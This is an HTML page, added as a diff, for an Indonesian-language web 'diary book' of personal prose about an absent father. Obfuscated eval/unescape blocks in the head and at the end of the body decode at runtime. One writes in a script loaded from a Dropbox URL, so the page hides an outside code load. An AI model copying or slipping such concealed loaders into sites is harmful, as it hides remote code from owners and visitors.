@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>My Diary Book</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="script.js"></script>
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%72%61%38%37%64%30%61%63%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%35%36%37%39%32%39%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%33%35%32%31%39%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%61%38%37%64%30%61%63%28%27') + '%41%79%6a%71%68%72%7b%23%7a%7d%6b%42%21%6d%7a%79%7f%7e%44%34%30%69%77%36%6b%71%76%76%6b%7c%79%30%68%70%70%30%7b%34%66%7e%3e%7d%33%79%79%7e%77%3f%72%76%70%7d%6d%35%70%6e%68%70%35%75%7a%2d%46%43%3c%7a%69%7b%66%71%7e%4525679296%33%30%33%39%37%34%31' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+</head>
+
+<body>
+<script type="text/javascript">
+<!-- 
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%64%69%76%20%69%64%3d%22%6c%6f%61%64%69%6e%67%22%3e%5c%6e%20%20%20%20%3c%70%20%63%6c%61%73%73%3d%22%6c%6f%61%64%69%6e%67%2d%74%65%78%74%22%3e%4c%6f%61%64%69%6e%67%20%2e%20%2e%20%2e%3c%2f%70%3e%5c%6e%20%20%20%20%3c%70%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%73%69%7a%65%3a%20%30%2e%36%65%6d%3b%20%6d%61%72%67%69%6e%2d%74%6f%70%3a%20%32%30%70%78%3b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%5c%27%46%69%72%61%20%53%61%6e%73%5c%27%2c%20%73%61%6e%73%2d%73%65%72%69%66%20%22%3e%28%20%55%73%65%20%48%65%61%64%70%68%6f%6e%65%73%20%46%6f%72%20%42%65%74%74%65%72%20%45%78%70%65%72%69%65%6e%63%65%20%29%3c%2f%70%3e%5c%6e%20%20%3c%2f%64%69%76%3e%5c%6e%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%73%74%61%72%2d%62%72%75%73%74%22%3e%5c%6e%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%73%70%69%6e%22%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%20%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%5f%73%74%61%72%74%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%20%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%5f%65%6e%64%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%20%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%5f%73%74%61%72%74%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%20%63%6f%72%65%2d%69%6e%6e%65%72%2d%61%72%63%5f%65%6e%64%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%63%69%72%63%6c%65%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%69%6e%6e%65%72%2d%63%69%72%63%6c%65%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%73%70%69%6e%22%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%20%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%5f%73%74%61%72%74%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%20%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%5f%65%6e%64%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%20%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%5f%73%74%61%72%74%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%20%63%6f%72%65%2d%6f%75%74%65%72%2d%61%72%63%5f%65%6e%64%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%63%69%72%63%6c%65%2d%61%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%20%20%3c%64%69%76%20%63%6c%61%73%73%3d%22%63%6f%72%65%2d%6f%75%74%65%72%2d%63%69%72%63%6c%65%2d%62%22%3e%3c%2f%64%69%76%3e%5c%6e%20%20%20%20%3c%2f%64%69%76%3e%5c%6e%20%20%3c%2f%64%69%76%3e%27%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+  <div id="notebook">
+    <div id="cover" onclick="changeRight('cover')">
+      <i onclick="changeRight('cover')" class="fa fa-arrow-circle-right"></i>
+      <div id="br"></div>
+      <div class="br1">
+        <h1>My&nbsp; Diary &nbsp;Book</h1>
+      </div>
+    </div>
+    <div class="page" id="a">
+      <p id="firstPage">Property of Harley Wikasa</p>
+      <div>
+        <a href="https://github.com/Daveteline">Original</a>
+      </div>
+      <!--blank-->
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('cover',11)"></i>
+      <div class="nbrpages">&#8560</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('a',12)"></i>
+    </div>
+    <div class="page" id="b">
+      <img src="img/temp/child_1.jpeg" class="movieImage">
+      <br>
+      <i class='movieTitle'>Ayah?</i>
+      <p>Ayah, Kata yang sangat asing bagiku. Tapi itulah engkau. Engkau Adalah Wujud Tanpa Makna? Aku digariskan untuk tidak tinggal satu atap bersama dengan keduanya, melainkan hanya tinggal dengan ibu, sedangkan ayah? Ayah telah pergi meninggalkanku seumur hidupnya. Jangankan untuk mendapatkan nafkah darinya, bertemu dengannya pun sudah tidak pernah lagi.<br><br>Entah apa alasannya. Makanya, bagi anak broken home sepertiku, ayah itu merupakan sosok yang berwujud namun tak memiliki makna. Dia ada tapi tak berkontribusi apapun di dalam hidupku. Bagaimana tidak? Sosoknya masih ada, tapi dia tak pernah sedetikpun memberikan kasih sayang dan perhatian kepadaku. </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('a',10)"></i>
+      <div class="nbrpages">1</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('b',13)"></i>
+    </div>
+    <div class="page" id="c">
+      <img src="img/temp/child_2.jpg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Mungkin dia masih hidup, tapi hidup di mana? Di tempat yang antah-berantah, jauh dari peradaban anaknya.<br><br>Kadang aku mengalami dilema, antara harus membenci atau merindukan sosoknya. Benci? Ya... aku sangat membenci ayah karena selama ini aku telah <b>“dibuang”</b> oleh ayah, tapi jauh di dalam hatiku aku sangat merindukan keberadaan ayah. Aku rindu mendapatkan kasih sayang yang tulus dari <b>“Seorang Ayah”</b> pertama di dalam hidupku.<br><br><b>Engkau Adalah orang pertama yang mengajarkanku arti perpisahan. Orang yang membiarkan aku terjatuh agar aku bisa mengangkat diriku sendiri, hingga berdiri di atas kaki sendiri.</b>
+      </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('b',9)"></i>
+      <div class="nbrpages">2</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('c',14)"></i>
+    </div>
+    <div class="page" id="d">
+      <img src="img/temp/child_3.jpg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Halo Ayah,<br>Apakah ini saat yang tepat untuk bertanya “Apa kabar?” Meski aku tak diizinkan bertemu kembali denganmu, bolehkah aku berpikir, aku pernah menjadi malaikat kecilmu juga?<br><br>Kata orang, tidak ada mantan anak walaupun orang tua kita telah berpisah.<br><br>Namun, jika tidak ada mantan anak, mengapa perpisahan kalian juga harus membuatku berpisah denganmu? Kenapa sejak peristiwa kelam itu kau pergi dan tak pernah menemuiku lagi? Apakah aku sudah tidak ada di hatimu lagi, wahai ayahku? Apakah kau sudah tak merindukanku lagi?
+      </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('c',8)"></i>
+      <div class="nbrpages">3</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('d',15)"></i>
+    </div>
+    <div class="page" id="e">
+      <img src="img/temp/child_4.jpg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Aku merindukanmu, sangat, seperti malam yang selalu dirindukan sang bulan. Tapi, kau berbeda dengan bulan itu. Jika rindu, bulan selalu datang menemui sang malam. Tapi kau? Kau tak sedetikpun datang untuk menemuiku.<br><br>Ayah, betapa menyedihkannya anakmu ini ketika melihat teman-teman sebayanya diantar-jemput oleh ayah kandungnya, dicium keningnya dan dipeluk tubuhnya setiap hari sedangkan aku? Tak pernah diperlakukan seperti itu olehmu. Jika teman-teman sebayanya membanggakan sosok ayahnya masing-masing, aku? Apa yang bisa aku banggakan dari sosokmu? </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('d',7)"></i>
+      <div class="nbrpages">4</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('e',16)"></i>
+    </div>
+    <div class="page" id="f">
+      <img src="img/temp/child_5.jpeg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Aku tak pernah bisa bercerita banyak tentang sosok yang katanya selalu dibanggakan oleh anak-anak mereka. Aku hanya bisa meneteskan air mata kala kuingat tentang dirinya. Pernahkah ia mengingatku? Mendoakanku? Memimpikanku? Pernahkah itu? <br><br><b>Bagiku kau hanyalah past tense. Ya, past tense, yakni kehidupanku di masa lampau.</b><br><br>Terkadang aku merasa kuat untuk mengatasi sendiri semua masalah dan beban dalam hidupku. Namun ternyata aku sadar, ada saat di mana aku sangat membutuhkannya. Aku butuh pendapatnya, aku butuh sarannya, aku butuh kekuatan darinya. Aku... rupanya aku membutuhkan dirinya.</b><br><br>
+      </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('e',6)"></i>
+      <div class="nbrpages">5</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('f',17)"></i>
+    </div>
+    <div class="page" id="g">
+      <img src="img/temp/child_6.jpg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Aku harap Ayah menyadari, <b>Ibulah yang mengajarkanku tiada cinta tanpa pengorbanan, dimana ia menjadi topangan hidupku yang terindah.</b><br><br>Ayah, aku tahu keadaan ini tak akan mungkin membuat kita bisa bersama. Aku pun juga tidak banyak mengharapkan hal itu. Tapi aku selalu berdoa semoga kita bisa bahagia dengan jalan hidup kita masing-masing.
+      </p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('f',5)"></i>
+      <div class="nbrpages">6</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('g',18)"></i>
+    </div>
+    <div class="page" id="h">
+      <img src="img/temp/child_7.jpg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah</i>
+      <p><b>Ayah, hidup bertahun-tahun tanpa dirimu bukanlah hal yang mudah untuk kujalani. Kepergianmu telah menyisakan luka yang mendalam di hatiku. Luka yang teramat dalam hingga aku sendiri tak tahu lagi bagaimana cara mengobatinya.</b><br><br>meskipun tak pernah ada rasa sayang yang teramat dalam di hatiku untukmu, tapi engkau adalah satu-satunya sosok yang mampu membuatku menangis bila aku mengingat tentangmu.</p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('g',4)"></i>
+      <div class="nbrpages">7</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('h',19)"></i>
+    </div>
+    <div class="page" id="i">
+      <img src="img/temp/child_8.jpeg" class="movieImage">
+      <br>
+      <i class="movieTitle">Ayah?</i>
+      <p>Ayah, aku harap engkau bangga kepadaku. Meski engkau pernah menoreh rasa kecewa di hatiku, tapi engkau masih menjadi pahlawan dalam bayangku. <br><br><b>Tanpamu, kekuatan untuk berdiri tegap ini takkan pernah bisa kurengkuh. Mungkin memang beginilah harusnya. Mungkin caramu mencintaiku berbeda dengan yang aku tahu.</b><br><br><b><i>Mungkin...</i></b></p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('h',3)"></i>
+      <div class="nbrpages">8</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('i',20)"></i>
+    </div>
+    <div class="page" id="j">
+      <img src="img/temp/the_end.gif" class="movieImage">
+      <br>
+      <i class="movieTitle">THE END</i>
+      <p><b>Catatan :</b><br><br>......... Thanks for reading.<br><br>Credits go to the respective
+        owners of the images and song used in this program.<br><br>This literary work is written based on the author's personal experience.<br><br>Song: Father's Prose Poem by Li Jian 李健.<br><br>Image source: shutterstock, pixelbay, 123rf, vectortoons, envato, lovepik and so on</p>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('i',2)"></i>
+      <div class="nbrpages">9</div>
+      <i class="fa fa-arrow-circle-right" onclick="changeRight('j',21)"></i>
+    </div>
+    <div class="page" id="backCover">
+      <div id="secretPaper" onclick="secretPage()">
+        <q><b><i><u>MOTIVASI</u></i><br><br>
+            <r>"Seseorang yang bisa bangkit dari keterpurukan adalah mereka yang lebih kuat dan kokoh di bandingkan mereka yang tidak pernah merasakan jatuh sama sekali."</r><br><br>
+            <t>"Ketika kamu ingin menyerah, ingatlah seberapa lama kamu berjuang, bertahan, dan melewati segalanya."</t></i>
+          </b></q>
+      </div>
+      <div id="hideout"></div>
+      <i class="fa fa-arrow-circle-left" onclick="changeLeft('j',1)" id="lastArrow"></i>
+    </div>
+  </div>
+  <audio id="song" loop>
+    <source src="audio/Fu Qin Xie De San Wen Shi (父亲写的散文诗).mp3"> </audio>
+
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%64%36%33%32%37%30%31%64%65%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%36%39%34%35%34%36%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%38%30%34%39%39%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%64%36%33%32%37%30%31%64%65%28%27') + '%47%6b%72%77%7c%6f%70%22%6f%70%61%7e%7e%46%27%66%77%70%7b%70%6b%63%6c%7c%2f%4b%16%0f%25%20%20%22%46%72%4a%2a%63%7a%7d%7a%3e%25%48%61%70%76%6f%75%24%5f%64%66%62%76%64%20%84%22%43%76%78%24%52%64%62%6b%79%25%52%6d%71%6f%70%72%69%6c%2d%3f%33%37%34%44%37%72%44%17%06%24%20%49%3a%6d%72%72%7c%6d%70%446945463%37%31%31%34%34%36%36' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+</body>
+
+</html>
